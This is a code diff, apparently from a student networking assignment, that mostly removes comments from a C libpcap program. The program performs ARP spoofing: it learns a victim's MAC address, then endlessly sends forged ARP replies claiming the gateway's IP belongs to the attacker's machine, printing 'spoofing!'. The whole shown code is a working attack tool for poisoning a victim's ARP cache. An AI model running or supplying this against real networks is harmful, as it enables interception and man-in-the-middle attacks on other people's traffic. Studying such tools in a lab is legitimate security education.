@@ -11,35 +11,32 @@
 
 #define ARP_PACKET_SIZE 60
 
-int getLocalAddrInfo(char *ip_buf, char *mac_buf); // Local IP + Local Mac
-void str2hexMac(char *string_mac, uint8_t *hex_mac); // aa:aa:aa:aa:aa:aa
-void str2hexIp(char *string_ip, uint8_t *hex_ip); // aaa.aaa.aaa.aaa
+int getLocalAddrInfo(char *ip_buf, char *mac_buf);
+void str2hexMac(char *string_mac, uint8_t *hex_mac);
+void str2hexIp(char *string_ip, uint8_t *hex_ip);
 void sendArpPacket(pcap_t *p, char * src_mac, char * dst_mac, char *src_ip, char * dst_ip, u_short option);
 
 int main(int argc, char * argv[])
 {
-	pcap_t *handle;	 	//handler
-	char *dev;	// network device enp0s3
+	pcap_t *handle;	 
+	char *dev;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct pcap_pkthdr *header;
+	const u_char *packet;
 
-	char errbuf[PCAP_ERRBUF_SIZE];	// error
-	struct pcap_pkthdr *header;	// pcap header time, caplen, len
-	const u_char *packet;		// actual packet
-
-	struct in_addr local_addr;	// local addr
+	struct in_addr local_addr;
 	
-	if(argc != 4){// 
+	if(argc != 4){
 		printf("wrong input\n");
 		exit(1);
 	}
 
-	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf); // packet capture
-     //dev, snaplen, promisc mode, to_ms, errbuf -> return null
+	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
 		printf("pcap_open_error\n");
 		exit(1);
 	}
 
-	// get local ip, mac addr
 	uint8_t local_ip_strbuf[16] = {0};
 	uint8_t local_mac_strbuf[18] = {0};	
 	if(!getLocalAddrInfo(local_ip_strbuf, local_mac_strbuf))
@@ -49,17 +46,17 @@ int main(int argc, char * argv[])
 	}
 
 	printf("get local!\n");
-	struct ether_header * ether_packet; //dst eth addr, src eth addr, ethr_type
-	struct ether_arp *arp_packet; // ea_hdr sender hardware addr, sender protocal address, target hardware address, target protocal address
+	struct ether_header * ether_packet;
+	struct ether_arp *arp_packet;
 
 	int check;
 	while(1) {
-		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", local_ip_strbuf, argv[2], 1); // broadcast who has victim?  tell me
+		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", local_ip_strbuf, argv[2], 1); 
 		printf("broadcast arp request\n");
 		check = pcap_next_ex(handle, &header, &packet);
-		if(check == 0) // timeout
+		if(check == 0)
 			continue;
-		else if(check == -1) // error
+		else if(check == -1)
 		{
 			printf(" pcap next error\n");
 			exit(1);
@@ -83,7 +80,7 @@ int main(int argc, char * argv[])
 
 	while(1)
 	{
-		sendArpPacket(handle, local_mac_strbuf, victim_mac, argv[3], argv[2], 2); // send arp reply to victim forever
+		sendArpPacket(handle, local_mac_strbuf, victim_mac, argv[3], argv[2], 2);
 		printf("spoofing!");
 		sleep(3);
 	}
@@ -91,7 +88,7 @@ int main(int argc, char * argv[])
 }
 
 int getLocalAddrInfo(char *ip_buf, char *mac_buf) 
-{
+{//like..python...
 	FILE * fp;
 	fp = popen("ifconfig enp0s3 | grep 'inet ' | awk '{print $2}'", "r");
 	if(fp == NULL)
@@ -135,12 +132,11 @@ void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf, char *src_ip
 	p_eth = (struct ether_header *)buf;
 	p_arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
 
-	// make ether_arp->ea_hdr
-	p_arp->ea_hdr.ar_hrd = htons(1); //hardware address
-	p_arp->ea_hdr.ar_pro = htons(0x0800); //protocal address
-	p_arp->ea_hdr.ar_hln = 6; // hardware length
-	p_arp->ea_hdr.ar_pln = 4;// prrotocol length
-	p_arp->ea_hdr.ar_op = htons(option); // arp opcode
+	p_arp->ea_hdr.ar_hrd = htons(1); 
+	p_arp->ea_hdr.ar_pro = htons(0x0800); 
+	p_arp->ea_hdr.ar_hln = 6; 
+	p_arp->ea_hdr.ar_pln = 4;
+	p_arp->ea_hdr.ar_op = htons(option);
 
 	uint8_t src_mac[6];
 	str2hexMac(src_mac_buf, src_mac); 
@@ -157,7 +153,6 @@ void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf, char *src_ip
 	uint8_t dst_ip[4];
 	str2hexIp(dst_ip_buf, dst_ip);
 
-	// make ether_arp's remains
 	memcpy(p_arp->arp_sha, src_mac, 6);
 	memcpy(p_arp->arp_spa, src_ip, 4);
 	memcpy(p_arp->arp_tha, dst_mac, 6);
